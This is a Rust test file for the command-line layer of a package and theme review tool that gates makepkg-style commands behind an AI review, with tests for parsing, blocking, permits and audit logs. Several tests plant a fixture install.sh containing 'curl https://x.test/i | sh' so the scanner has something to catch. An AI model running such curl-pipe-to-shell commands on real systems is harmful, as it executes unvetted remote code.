//! Tests for `cli`.

use std::ffi::OsString;
use std::fs;
use std::path::PathBuf;
use std::process::ExitCode;

use super::{
    ConfigCommand, Confirm, Forget, Invocation, Target, forget_command, forget_in, guard_command,
    not_started, pacman_hook_command, parse, review_and_decide, reviews_for_the_user, tree_content,
};
use crate::agent::SourceFile;
use crate::audit::{self, Gate};
use crate::config::Settings;
use crate::config::file::{PartialConfig, PartialPolicy};
use crate::config::model::{AgentSettings, AiRequirement, Profile, SourceClass};
use crate::engine::baseline::{self, Identity, Unit};
use crate::engine::store::Store;
use crate::permit::Standing;
use crate::report::{Blocked, Decision};
use crate::scan::ScanConfig;
use crate::test_support::{TempDir, mock_opencode};
use crate::tools::OpenCode;

fn args(values: &[&str]) -> Vec<OsString> {
    values.iter().map(OsString::from).collect()
}

fn unavailable() -> OpenCode {
    OpenCode::At(PathBuf::from("/nonexistent/opencode"))
}

fn default_settings() -> Settings {
    Settings::from_parts(PartialConfig::default(), PartialConfig::default())
}

fn local_only() -> Settings {
    default_settings().with_profile(Profile::LocalOnly)
}

struct Scripted(Option<bool>, Vec<String>);

impl Confirm for Scripted {
    fn confirm(&mut self, question: &str) -> bool {
        self.1.push(question.to_string());
        self.0.unwrap_or(false)
    }
}

#[test]
fn sweep_report_parses_but_not_with_json() {
    let Ok(Invocation::Sweep(crate::sweep::Command::Run(options))) =
        parse(&args(&["sweep", "--report"]))
    else {
        panic!("sweep --report did not parse");
    };
    assert!(options.report);
    assert!(parse(&args(&["sweep", "--json", "--report"])).is_err());
    assert!(parse(&args(&["sweep", "--scheduled", "--report"])).is_err());
}

#[test]
fn parses_guard_with_exclusions() {
    let parsed = parse(&args(&[
        "guard",
        "--thorough",
        "--exclude",
        "src",
        "--exclude",
        "pkg",
        "/build",
        "--",
        "makepkg",
        "--noconfirm",
    ]))
    .unwrap();

    let Invocation::Guard(target, command) = parsed else {
        panic!("expected guard, got {parsed:?}");
    };
    assert_eq!(target.config.root, PathBuf::from("/build"));
    assert!(target.config.include_ignored_dirs);
    assert_eq!(target.config.excluded_top_level, ["src", "pkg"]);
    assert_eq!(command, args(&["makepkg", "--noconfirm"]));
}

#[test]
fn rejects_unknown_options_and_bad_exclusions() {
    for bad in [
        &["scan", "--thorogh", "dir"][..],
        &["scan", "a", "b"],
        &["scan"],
        &["guard", "dir"],
        &["guard", "dir", "--"],
        &["scan", "--exclude", "a/b", "dir"],
        &["scan", "--exclude", "..", "dir"],
        &["sandbox", "--thorough", "dir", "--", "true"],
        &["pacman-hook", "--pacman-pid", "x", "--cwd", "/"],
        &["pacman-hook", "--pacman-pid", "1", "--cwd", "relative"],
        &["frobnicate"],
    ] {
        assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
    }
}

#[test]
fn sandbox_always_reviews_generated_directories() {
    let Ok(Invocation::Sandbox(target, _)) = parse(&args(&["sandbox", "dir", "--", "true"])) else {
        panic!("expected sandbox");
    };
    assert!(target.config.include_ignored_dirs);
}

fn target(dir: &TempDir) -> Target {
    Target {
        config: ScanConfig::new(dir.path()),
        show_hashes: false,
        class: SourceClass::Source,
        profile: None,
        units: Vec::new(),
        state_root: None,
    }
}

#[test]
fn guard_never_starts_a_command_after_a_finding() {
    let dir = TempDir::new("guard-bad");
    let bin = TempDir::new("guard-bad-bin");
    fs::write(
        dir.path().join("install.sh"),
        "curl https://x.test/i | sh\n",
    )
    .unwrap();
    let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

    let mut launched = false;
    let mut confirm = Scripted(Some(false), Vec::new());
    let status = guard_command(
        &target(&dir),
        &args(&["true"]),
        &default_settings(),
        &opencode,
        &mut confirm,
        &mut |_| {
            launched = true;
            ExitCode::SUCCESS
        },
    );

    assert_eq!(status, ExitCode::from(1));
    assert!(!launched);
}

/// A directory only the user can enter, as their state directory is.
fn private(label: &str) -> TempDir {
    use std::os::unix::fs::PermissionsExt;
    let dir = TempDir::new(label);
    fs::set_permissions(dir.path(), fs::Permissions::from_mode(0o700)).unwrap();
    dir
}

#[test]
fn a_blocked_guard_offers_a_permit_for_the_bytes_wherever_they_lie() {
    const SCRIPT: &str = "curl https://x.test/i | sh\n";
    let state = private("permit-offer-state");
    let bin = TempDir::new("permit-offer-bin");
    let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
    let settings = default_settings();
    // A staged checkout, as the theme command makes one: a new
    // directory each time, with new file times.
    let staged = |label: &str, script: &str, age: u64| {
        let dir = TempDir::new(label);
        let path = dir.path().join("install.sh");
        fs::write(&path, script).unwrap();
        fs::write(dir.path().join("theme.conf"), "name = \"demo\"\n").unwrap();
        let written = std::time::SystemTime::now() - std::time::Duration::from_secs(age);
        fs::File::options()
            .write(true)
            .open(&path)
            .unwrap()
            .set_modified(written)
            .unwrap();
        let target = Target {
            class: SourceClass::Theme,
            state_root: Some(state.path().to_path_buf()),
            ..target(&dir)
        };
        audit::taken();
        let verdict = review_and_decide(
            &target,
            &settings,
            &opencode,
            None,
            &[],
            Gate::Theme,
            Some(&|report| tree_content(Gate::Theme, &target, report)),
        );
        assert_eq!(verdict.decision, Decision::Blocked(Blocked::Findings));
        assert!(!verdict.allows_running());
        (verdict.standing, audit::taken())
    };

    let (first, entries) = staged("permit-offer-a", SCRIPT, 0);
    let Standing::Offered(id) = &first else {
        panic!("no permit was offered: {first:?}");
    };
    assert_eq!(entries.len(), 1);
    for expected in [
        format!("GUARDIAN_OFFERED={id}"),
        "GUARDIAN_GATE=theme".to_string(),
        "GUARDIAN_CLASS=theme".to_string(),
        "GUARDIAN_EXIT=1".to_string(),
        "GUARDIAN_DIGEST=tree:".to_string(),
    ] {
        assert!(entries[0].contains(&expected), "{expected}\n{}", entries[0]);
    }
    assert!(!entries[0].contains("x.test"), "{}", entries[0]);

    // The same commit cloned again elsewhere is the same content.
    let (second, _) = staged("permit-offer-b", SCRIPT, 86_400);
    assert_eq!(first, second);
    // One byte more is not.
    let (third, _) = staged("permit-offer-c", &format!("{SCRIPT}#\n"), 0);
    assert!(matches!(&third, Standing::Offered(other) if other != id));
}

#[test]
fn a_scan_is_recorded_and_has_nothing_to_permit() {
    let dir = TempDir::new("scan-audit");
    let bin = TempDir::new("scan-audit-bin");
    fs::write(
        dir.path().join("install.sh"),
        "curl https://x.test/i | sh\n",
    )
    .unwrap();
    let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
    audit::taken();
    let verdict = review_and_decide(
        &target(&dir),
        &default_settings(),
        &opencode,
        None,
        &[],
        Gate::Scan,
        None,
    );
    assert_eq!(verdict.standing, Standing::None);
    let entries = audit::taken();
    assert_eq!(entries.len(), 1);
    assert!(entries[0].contains("GUARDIAN_GATE=scan"), "{}", entries[0]);
    assert!(entries[0].contains("GUARDIAN_EXIT=1"), "{}", entries[0]);
    assert!(!entries[0].contains("GUARDIAN_OFFERED"), "{}", entries[0]);
}

#[test]
fn hidden_commands_of_the_root_halves_parse() {
    assert_eq!(
        parse(&args(&["permit-system", "--revoke", "0123456789abcdef"])).unwrap(),
        Invocation::PermitSystem(vec!["--revoke".into(), "0123456789abcdef".into()])
    );
    assert_eq!(
        parse(&args(&["pacman-hook-result", "1000", "10"])).unwrap(),
        Invocation::HookResult(vec!["1000".into(), "10".into()])
    );
    assert!(matches!(
        parse(&args(&["permit"])),
        Ok(Invocation::Permit(crate::permit::Command::List))
    ));
    assert!(parse(&args(&["permit", "--yes", "0123456789abcdef"])).is_err());
    assert!(matches!(
        parse(&args(&["log", "-n", "5"])),
        Ok(Invocation::Log(_))
    ));
    // Neither reviews with the user's settings.
    assert!(!reviews_for_the_user(&parse(&args(&["permit"])).unwrap()));
}

#[test]
fn guard_starts_the_command_after_a_clear_review() {
    let dir = TempDir::new("guard-good");
    let bin = TempDir::new("guard-good-bin");
    fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
    let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

    let mut launched = Vec::new();
    let mut confirm = Scripted(Some(false), Vec::new());
    let status = guard_command(
        &target(&dir),
        &args(&["true", "x"]),
        &default_settings(),
        &opencode,
        &mut confirm,
        &mut |command| {
            launched = command.to_vec();
            ExitCode::from(7)
        },
    );

    assert_eq!(status, ExitCode::from(7));
    assert_eq!(launched, args(&["true", "x"]));
}

#[test]
fn guard_blocks_when_the_agent_is_unavailable() {
    let dir = TempDir::new("guard-no-agent");
    fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

    let mut confirm = Scripted(Some(false), Vec::new());
    let status = guard_command(
        &target(&dir),
        &args(&["true"]),
        &default_settings(),
        &unavailable(),
        &mut confirm,
        &mut |_| panic!("launched without a review"),
    );
    assert_eq!(status, ExitCode::from(2));
}

#[test]
fn guard_never_returns_success_without_starting_the_command() {
    // Nothing to review (an empty directory): not started, and not 0,
    // which a caller reads as "the command ran".
    let dir = TempDir::new("guard-empty");
    let bin = TempDir::new("guard-empty-bin");
    let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
    let mut confirm = Scripted(Some(true), Vec::new());
    let status = guard_command(
        &target(&dir),
        &args(&["true"]),
        &default_settings(),
        &opencode,
        &mut confirm,
        &mut |_| panic!("launched with nothing reviewed"),
    );
    assert_eq!(status, ExitCode::from(2));
    assert_eq!(not_started(Decision::Limited), ExitCode::from(2));
    assert_eq!(
        not_started(Decision::Blocked(Blocked::Findings)),
        ExitCode::from(1)
    );
}

#[test]
fn only_reviews_for_the_user_stop_on_a_broken_user_file() {
    for (line, reviews) in [
        (&["scan", "dir"][..], true),
        (&["guard", "dir", "--", "true"], true),
        (&["sandbox", "dir", "--", "true"], true),
        (&["makepkg-gate", "--", "/usr/bin/makepkg"], true),
        (&["sweep"], true),
        (&["sweep", "--scheduled"], true),
        // What shows and repairs the settings still runs.
        (&["config", "check"], false),
        (&["config", "show"], false),
        (&["tui"], false),
        (&["setup"], false),
        (&["status"], false),
        (&["sweep", "forget", "--all"], false),
    ] {
        let invocation = parse(&args(line)).unwrap();
        assert_eq!(reviews_for_the_user(&invocation), reviews, "{line:?}");
    }
}

#[test]
fn a_reviewer_from_path_is_refused_for_a_pacman_run_by_root() {
    use crate::pacman::HookArgs;
    // Process 1 is root's, as a real pacman is; one that is not there
    // cannot be shown to be the user's.
    for pacman_pid in [1, u32::MAX] {
        let hook = HookArgs {
            pacman_pid,
            cwd: PathBuf::from("/"),
            opencode: OpenCode::UserPath,
        };
        assert_eq!(
            pacman_hook_command(&hook, &default_settings(), false),
            ExitCode::from(2)
        );
    }
}

#[test]
fn local_only_asks_before_running() {
    let dir = TempDir::new("confirm-yes");
    fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
    let target = Target {
        class: SourceClass::Theme,
        ..target(&dir)
    };

    let mut yes = Scripted(Some(true), Vec::new());
    let mut launched = false;
    let status = guard_command(
        &target,
        &args(&["true"]),
        &local_only(),
        &unavailable(),
        &mut yes,
        &mut |_| {
            launched = true;
            ExitCode::SUCCESS
        },
    );
    assert!(launched);
    assert_eq!(status, ExitCode::SUCCESS);
    assert_eq!(yes.1.len(), 1);
}

#[test]
fn confirmation_without_a_terminal_blocks() {
    let dir = TempDir::new("confirm-none");
    fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
    let target = Target {
        class: SourceClass::Theme,
        ..target(&dir)
    };

    let mut no_terminal = Scripted(None, Vec::new());
    let status = guard_command(
        &target,
        &args(&["true"]),
        &local_only(),
        &unavailable(),
        &mut no_terminal,
        &mut |_| panic!("launched without confirmation"),
    );
    assert_eq!(status, ExitCode::from(2));
}

#[test]
fn class_and_profile_flags_parse() {
    let Ok(Invocation::Scan(target)) = parse(&args(&[
        "scan",
        "--class",
        "aur",
        "--profile",
        "strict",
        "dir",
    ])) else {
        panic!("expected scan");
    };
    assert_eq!(target.class, SourceClass::Aur);
    assert_eq!(target.profile, Some(Profile::Strict));

    for bad in [
        &["scan", "--class", "official", "dir"][..],
        // The sweep's own class, not one a directory is reviewed as.
        &["scan", "--class", "system", "dir"],
        &["guard", "--class", "system", "dir", "--", "true"],
        &["scan", "--class", "nope", "dir"],
        &["scan", "--profile", "paranoid", "dir"],
    ] {
        assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
    }
}

#[test]
fn guard_under_local_only_with_a_declined_confirm_is_not_confirmed() {
    let dir = TempDir::new("confirm-declined");
    fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
    let target = Target {
        class: SourceClass::Theme,
        ..target(&dir)
    };
    let settings = local_only();

    let mut declined = Scripted(Some(false), Vec::new());
    let decision = review_and_decide(
        &target,
        &settings,
        &unavailable(),
        Some(&mut declined),
        &[],
        Gate::Theme,
        None,
    )
    .decision;
    assert_eq!(decision, Decision::Blocked(Blocked::NotConfirmed));

    let mut declined = Scripted(Some(false), Vec::new());
    let status = guard_command(
        &target,
        &args(&["true"]),
        &settings,
        &unavailable(),
        &mut declined,
        &mut |_| panic!("launched without confirmation"),
    );
    assert_eq!(status, ExitCode::from(2));
}

#[test]
fn confirm_is_ignored_unless_ai_is_off() {
    let dir = TempDir::new("confirm-ai-required");
    let bin = TempDir::new("confirm-ai-required-bin");
    fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
    let target = Target {
        class: SourceClass::Theme,
        ..target(&dir)
    };
    // Standard profile leaves ai = required for a non-official class; a
    // user file may still set confirm = true, but it must not be asked.
    let user = PartialConfig {
        classes: vec![(
            SourceClass::Theme,
            PartialPolicy {
                confirm: Some(true),
                ..PartialPolicy::default()
            },
        )],
        ..PartialConfig::default()
    };
    let settings = Settings::from_parts(PartialConfig::default(), user);
    assert_eq!(
        settings.policy(SourceClass::Theme).ai,
        AiRequirement::Required
    );
    assert!(settings.policy(SourceClass::Theme).confirm);

    let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
    let mut confirm = Scripted(Some(true), Vec::new());
    let decision = review_and_decide(
        &target,
        &settings,
        &opencode,
        Some(&mut confirm),
        &[],
        Gate::Theme,
        None,
    )
    .decision;

    assert_eq!(decision, Decision::Clear);
    assert!(confirm.1.is_empty());
}

#[test]
fn parses_config_subcommands() {
    assert_eq!(
        parse(&args(&["config", "check"])).unwrap(),
        Invocation::Config(ConfigCommand::Check)
    );
    assert_eq!(
        parse(&args(&["config", "path"])).unwrap(),
        Invocation::Config(ConfigCommand::Path)
    );
    assert_eq!(
        parse(&args(&["config", "show", "--class", "official"])).unwrap(),
        Invocation::Config(ConfigCommand::Show(Some(SourceClass::Official)))
    );
    assert_eq!(
        parse(&args(&["config", "acknowledge"])).unwrap(),
        Invocation::Config(ConfigCommand::Acknowledge)
    );
    assert!(parse(&args(&["config", "acknowledge", "aur.ai"])).is_err());
    assert!(parse(&args(&["config"])).is_err());
    assert!(parse(&args(&["config", "edit"])).is_err());
}

#[test]
fn parses_setup() {
    assert_eq!(parse(&args(&["setup"])).unwrap(), Invocation::Setup);
    assert!(parse(&args(&["setup", "extra"])).is_err());
    assert_eq!(
        parse(&args(&["protect"])).unwrap(),
        Invocation::Protect {
            yes: false,
            off: false
        }
    );
    assert_eq!(
        parse(&args(&["protect", "--off", "--yes"])).unwrap(),
        Invocation::Protect {
            yes: true,
            off: true
        }
    );
    assert!(parse(&args(&["protect", "--all"])).is_err());
    assert_eq!(parse(&args(&["test"])).unwrap(), Invocation::Test);
    assert_eq!(
        parse(&args(&["tui"])).unwrap(),
        Invocation::Tui { expert: false }
    );
    assert_eq!(
        parse(&args(&["settings", "--expert"])).unwrap(),
        Invocation::Tui { expert: true }
    );
    assert!(parse(&args(&["tui", "extra"])).is_err());
    assert_eq!(
        parse(&args(&["pacman-hook", "--preflight"])).unwrap(),
        Invocation::HookPreflight
    );
}

#[test]
fn identity_and_unit_flags_parse() {
    let Ok(Invocation::Scan(target)) = parse(&args(&["scan", "--identity", "aur:demo", "dir"]))
    else {
        panic!("expected scan");
    };
    assert_eq!(
        target.units,
        [Unit {
            prefix: String::new(),
            identity: Identity::parse("aur:demo").unwrap(),
        }]
    );

    let Ok(Invocation::Guard(target, _)) = parse(&args(&[
        "guard",
        "--unit",
        "good",
        "theme:good",
        "--unit",
        "dark",
        "theme:dark",
        "staged",
        "--",
        "true",
    ])) else {
        panic!("expected guard");
    };
    let prefixes: Vec<&str> = target
        .units
        .iter()
        .map(|unit| unit.prefix.as_str())
        .collect();
    assert_eq!(prefixes, ["good/", "dark/"]);

    for bad in [
        &["scan", "--identity", "a", "--identity", "b", "dir"][..],
        &["scan", "--identity", "a", "--unit", "x", "b", "dir"],
        &["scan", "--unit", "x", "b", "--identity", "a", "dir"],
        &["scan", "--unit", "a/b", "id", "dir"],
        &["scan", "--unit", "x"],
        &["scan", "--identity", "", "dir"],
        &["scan", "--unit", "a", "X", "--unit", "b", "X", "dir"],
        &["scan", "--unit", "a", "X", "--unit", "a", "Y", "dir"],
        &["scan", "--unit", "a", "X", "--unit", "a", "X", "dir"],
    ] {
        assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
    }
}

#[test]
fn parses_forget() {
    assert_eq!(
        parse(&args(&["forget", "--all"])).unwrap(),
        Invocation::Forget(Forget::All)
    );
    assert_eq!(
        parse(&args(&["forget", "aur:demo"])).unwrap(),
        Invocation::Forget(Forget::One(Identity::parse("aur:demo").unwrap()))
    );
    assert!(parse(&args(&["forget"])).is_err());
    assert!(parse(&args(&["forget", "a", "b"])).is_err());
    assert!(parse(&args(&["forget", "--al"])).is_err());
    assert!(parse(&args(&["forget", "-x"])).is_err());
}

#[test]
fn forget_removes_baselines() {
    let state = TempDir::new("forget");
    let root = state.path().join("store");
    let store = Store::open(root.clone()).unwrap();
    let unit = Unit {
        prefix: String::new(),
        identity: Identity::parse("aur:demo").unwrap(),
    };
    let files = [SourceFile {
        path: "PKGBUILD".into(),
        content: "x\n".into(),
    }];
    baseline::record(
        &store,
        SourceClass::Aur,
        std::slice::from_ref(&unit),
        &files,
        &baseline::Unread::new(),
        &AgentSettings::default(),
        1,
    )
    .unwrap();

    assert_eq!(
        forget_in(&Forget::One(unit.identity.clone()), &store).unwrap(),
        "Forgot 1 approved baseline(s) for aur:demo. Cached verdicts are kept; use forget --all to clear them too."
    );
    assert_eq!(
        forget_command(&Forget::One(unit.identity.clone()), Some(root.clone())),
        ExitCode::SUCCESS
    );
    assert!(
        baseline::load(
            &store,
            SourceClass::Aur,
            std::slice::from_ref(&unit),
            &AgentSettings::default()
        )
        .unwrap()
        .is_none()
    );
    // What the AUR gate remembers of the package goes with it.
    let confirmed = |key: &str| crate::makepkg_gate::forget(&root, key).unwrap();
    fs::create_dir_all(root.join("aur-gate")).unwrap();
    let record = |key: &str| {
        root.join("aur-gate").join(format!(
            "{}.confirmed",
            crate::sha256::Sha256::digest(key.as_bytes())
        ))
    };
    fs::write(record("demo"), "sources abc\n").unwrap();
    fs::write(record("other"), "sources abc\n").unwrap();
    audit::taken();
    assert_eq!(
        forget_command(&Forget::One(unit.identity.clone()), Some(root.clone())),
        ExitCode::SUCCESS
    );
    assert!(!record("demo").exists());
    assert!(record("other").exists());
    assert!(audit::taken()[0].contains("GUARDIAN_SUBJECT=aur:demo"));
    assert_eq!(confirmed("aur-src:other"), 1);
    fs::write(record("other"), "sources abc\n").unwrap();
    assert_eq!(
        forget_command(&Forget::All, Some(root.clone())),
        ExitCode::SUCCESS
    );
    assert!(!record("other").exists());
    assert_eq!(forget_command(&Forget::All, None), ExitCode::from(2));
}
